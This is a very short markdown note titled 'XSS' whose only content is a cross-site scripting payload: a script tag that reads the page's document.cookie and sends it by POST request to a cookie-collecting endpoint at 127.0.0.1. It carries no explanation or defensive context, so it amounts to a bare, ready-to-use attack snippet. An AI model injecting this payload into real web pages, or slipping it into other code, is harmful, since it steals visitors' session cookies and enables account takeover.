# XSS

```html
<script>fetch("http://127.0.0.1/cookie?value=" + document.cookie, {method: "POST"})</script>
```html